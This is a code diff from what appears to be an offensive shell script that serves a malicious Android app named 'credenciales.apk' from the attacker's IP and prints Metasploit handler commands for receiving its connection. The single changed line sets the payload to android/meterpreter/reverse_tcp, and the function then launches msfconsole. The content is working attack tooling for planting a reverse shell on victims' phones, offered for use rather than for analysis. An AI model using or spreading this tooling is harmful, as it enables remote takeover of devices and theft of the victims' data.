@@ -141,7 +141,7 @@ function payloads() {
       echo -e "\nYour link of Download is: http://$IP_L3/credenciales.apk\n"
       echo -e "\nThe ip of the metasploit session is: $lhostp "
       echo -e "\nThe port of the metasploit session is: $lportp"
-      echo -e "\nThe commands for the sploit are: \n use exploit/multi/handler \n set payload/meterpreter/reverse_tcp \n set LHOST $lhostp \n set LPORT $lportp \n exploit."
+      echo -e "\nThe commands for the sploit are: \n use exploit/multi/handler \n set payload android/meterpreter/reverse_tcp \n set LHOST $lhostp \n set LPORT $lportp \n exploit."
       msfconsole
 }
 
